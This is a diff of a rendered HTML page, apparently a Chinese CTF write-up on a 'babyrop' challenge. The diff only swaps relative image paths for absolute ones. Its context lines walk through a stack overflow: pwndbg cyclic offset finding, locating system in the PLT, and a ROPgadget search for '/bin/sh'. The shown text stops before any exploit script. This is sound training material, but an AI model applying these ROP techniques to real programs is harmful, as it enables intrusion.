@@ -404,7 +404,7 @@
 </span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
 </span></span></code></pre></div><p>64 位程序，不能使用 shellcode</p>
 <h2 id="ida-查看程序伪代码">ida 查看程序伪代码</h2>
-<p><img src="../../image/2902405-20221026161935830-84528978.png" alt="202209111828592022-09-11-18-29-00"></p>
+<p><img src="/image/2902405-20221026161935830-84528978.png" alt="202209111828592022-09-11-18-29-00"></p>
 <p>有 scanf，有 printf，看起来可能是普通的栈溢出，我们可以调试看看</p>
 <blockquote>
 <p>此题用不了格式化字符串漏洞，因为我们控制不了 format 字符串，只能控制后面跟的 args，而 printf 只会对 format 字符串作解析</p>
@@ -415,7 +415,7 @@
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; cyclic <span class="m">50</span>
 </span></span><span class="line"><span class="cl">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
 </span></span></code></pre></div><p>然后直接<code>r</code></p>
-<p><img src="../../image/2902405-20221026161936861-967929500.png" alt="202209111835432022-09-11-18-35-43"></p>
+<p><img src="/image/2902405-20221026161936861-967929500.png" alt="202209111835432022-09-11-18-35-43"></p>
 <p>然后我们看到栈情况是这样的：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">00:0000│ rsi rsp 0x7fffffffd770 ◂— <span class="s1">&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#39;</span>
 </span></span><span class="line"><span class="cl">01:0008│         0x7fffffffd778 ◂— <span class="s1">&#39;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#39;</span>
@@ -425,14 +425,14 @@
 </span></span><span class="line"><span class="cl">05:0028│         0x7fffffffd798 ◂— <span class="s1">&#39;kaaalaaama&#39;</span>
 </span></span><span class="line"><span class="cl">06:0030│         0x7fffffffd7a0 ◂— 0x1ff00616d /* <span class="s1">&#39;ma&#39;</span> */
 </span></span></code></pre></div><p>作者此时心中一喜，连按<code>n</code>继续到<code>ret</code>指令，看一看此时<code>rsp</code>栈顶指针指向哪里</p>
-<p><img src="../../image/2902405-20221026161937980-674504666.png" alt="202209111838142022-09-11-18-38-14"></p>
+<p><img src="/image/2902405-20221026161937980-674504666.png" alt="202209111838142022-09-11-18-38-14"></p>
 <p>我们发现 return 值可以被我们栈溢出掉，于是我们可以用<code>cyclic -l gaaa</code>来看一看偏移量是多少：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; cyclic -l gaaa
 </span></span><span class="line"><span class="cl"><span class="m">24</span>
 </span></span></code></pre></div><p>同时当前程序 plt 表中肯定有<code>system</code>（前面调用过），我们只需要<code>/bin/sh</code>或者<code>sh</code>就能构建 exp 了！</p>
 <h2 id="构建-exp">构建 exp</h2>
 <p>在 ida 中找到<code>system</code>的地址：</p>
-<p><img src="../../image/2902405-20221026161938417-2068553152.png" alt="202209111842122022-09-11-18-42-12"></p>
+<p><img src="/image/2902405-20221026161938417-2068553152.png" alt="202209111842122022-09-11-18-42-12"></p>
 <p><code>ROPgadget</code>寻找<code>/bin/sh</code>：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ROPgadget --binary babyrop --string <span class="s2">&#34;/bin/sh&#34;</span>
 </span></span><span class="line"><span class="cl">Strings <span class="nv">information</span>
